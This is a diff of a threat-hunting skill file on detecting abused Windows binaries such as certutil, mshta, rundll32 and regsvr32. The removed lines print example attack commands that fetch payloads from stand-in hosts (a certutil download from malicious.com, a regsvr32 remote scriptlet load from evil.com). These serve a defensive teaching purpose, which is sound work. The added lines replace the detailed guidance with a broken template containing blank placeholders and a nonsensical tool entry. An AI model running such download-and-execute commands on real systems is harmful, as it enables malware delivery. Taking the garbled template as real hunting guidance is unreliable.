@@ -27,8 +27,7 @@ nist_csf:
 - DE.AE-07
 - ID.RA-05
 ---
-
-# Hunting for Living-off-the-Land Binaries (LOLBins)
+# Hunting For Living Off The Land Binaries
 
 ## When to Use
 
@@ -48,94 +47,24 @@ nist_csf:
 
 ## Workflow
 
-1. **Define Hunt Hypothesis**: Formulate a hypothesis based on threat intel (e.g., "Adversaries are using certutil.exe to download second-stage payloads from external domains").
-2. **Identify Target LOLBins**: Select specific binaries from the LOLBAS Project database to hunt for, prioritizing those matching current threat landscape (certutil, mshta, rundll32, regsvr32, msiexec, wmic, cmstp, bitsadmin).
-3. **Collect Process Telemetry**: Query EDR or SIEM for process creation events involving target LOLBins with unusual command-line arguments, parent processes, or execution contexts.
-4. **Baseline Normal Behavior**: Establish what legitimate usage looks like for each LOLBin in your environment by analyzing historical frequency, typical parent processes, and standard arguments.
-5. **Identify Anomalies**: Compare current telemetry against baselines, flagging executions with network connections, encoded commands, unusual file paths, or abnormal parent-child process chains.
-6. **Correlate and Enrich**: Cross-reference anomalous LOLBin activity with network logs, DNS queries, file creation events, and threat intelligence feeds.
-7. **Document and Report**: Record findings, update detection rules, and create IOC lists for identified malicious LOLBin usage.
+1. **Define Detection Scope** — Identify the specific  techniques or indicators to hunt. Map to MITRE ATT&CK tactics/techniques where applicable.
+2. **Collect Baseline Data** — Gather historical logs and establish normal behavior patterns for .
+3. **Build Detection Queries** — Write living off the land binaries queries targeting  indicators. Use platform-specific query language for optimal performance.
+4. **Execute Hunts** — Run queries against the collected data, starting with broad filters and narrowing down.
+5. **Triage Results** — Investigate alerts, filter false positives, and validate findings against known-good behavior.
+6. **Document Findings** — Record confirmed detections, IOCs, and affected systems. Update detection rules based on findings.
 
-## Key Concepts
+## Tools
 
-| Concept | Description |
-|---------|-------------|
-| LOLBin | Legitimate OS binary abused by attackers for malicious purposes |
-| LOLBAS Project | Community-curated list of Windows LOLBins, LOLLibs, and LOLScripts |
-| T1218 | MITRE ATT&CK - Signed Binary Proxy Execution |
-| T1218.001 | Compiled HTML File (mshta.exe) |
-| T1218.002 | Control Panel (control.exe) |
-| T1218.003 | CMSTP |
-| T1218.005 | Mshta |
-| T1218.010 | Regsvr32 |
-| T1218.011 | Rundll32 |
-| T1197 | BITS Jobs (bitsadmin.exe) |
-| T1140 | Deobfuscate/Decode Files (certutil.exe) |
-| Proxy Execution | Using trusted binaries to execute untrusted code |
-| Fileless Attack | Attack that operates primarily in memory without dropping files |
-
-## Tools & Systems
-
-| Tool | Purpose |
-|------|---------|
-| CrowdStrike Falcon | EDR telemetry and process tree analysis |
-| Microsoft Defender for Endpoint | Advanced hunting with KQL queries |
-| Splunk | SIEM log aggregation and SPL queries |
-| Elastic Security | Detection rules and timeline investigation |
-| Sysmon | Detailed process creation and network logging |
-| LOLBAS Project | Reference database of LOLBin capabilities |
-| Sigma Rules | Generic detection rule format for LOLBins |
-| Velociraptor | Endpoint forensic collection and hunting |
-
-## Common Scenarios
-
-1. **Certutil Download Cradle**: Adversary uses `certutil.exe -urlcache -split -f http://malicious.com/payload.exe` to download malware, bypassing web proxies that allow certutil traffic.
-2. **Mshta HTA Execution**: Attacker delivers HTA file via email that executes VBScript payload through `mshta.exe`, which is a signed Microsoft binary.
-3. **Rundll32 DLL Proxy Load**: Malicious DLL loaded via `rundll32.exe shell32.dll,ShellExec_RunDLL` to proxy execution through a trusted binary.
-4. **Regsvr32 Squiblydoo**: Remote SCT file executed via `regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll` bypassing application whitelisting.
-5. **BITSAdmin Persistence**: Adversary creates BITS transfer job to repeatedly download and execute payloads using `bitsadmin /transfer`.
-
-## Red Flags
-
-- Performing actions without explicit written authorization from the asset owner
-- Testing against production systems without a defined scope and rules of engagement
-- Exceeding the authorized scope of the engagement
-- Leaving persistent access mechanisms without explicit approval
-- Causing denial-of-service on production systems during testing
+- **living off the land binaries** — Primary tool for this skill
+- **SIEM Platform** — Central log aggregation and query execution
+- **Sigma Rules** — Vendor-agnostic detection rule format
+- **MITRE ATT&CK Navigator** — Technique mapping and coverage analysis
 
 ## Verification
 
-- All steps executed successfully against a test environment before production use
-- Output documented with screenshots or logs demonstrating expected behavior
-- All exploited vulnerabilities documented with reproduction steps
-- Scope boundaries confirmed — only authorized targets were tested
-- Remediation recommendations included for every finding
-
-## Output Format
-
-```
-Hunt ID: TH-LOLBIN-[DATE]-[SEQ]
-Hypothesis: [Stated hypothesis]
-LOLBins Investigated: [List of binaries]
-Time Range: [Start] - [End]
-Data Sources: [EDR, Sysmon, SIEM]
-Findings:
-  - [Finding 1 with evidence]
-  - [Finding 2 with evidence]
-Anomalies Detected: [Count]
-True Positives: [Count]
-False Positives: [Count]
-IOCs Identified: [List]
-Detection Rules Created/Updated: [List]
-Recommendations: [Next steps]
-```
-
-## Overview
-
-> Section content — see SKILL.md body for full details.
-
-## Process
-
-1. Analyze the task requirements
-2. Apply domain expertise
-3. Verify output quality
+- [ ] All  procedures executed completely and documented
+- [ ] Findings validated against multiple data sources
+- [ ] False positives identified and filtered
+- [ ] Results documented with evidence and timestamps
+- [ ] Recommendations provided with risk-based prioritization
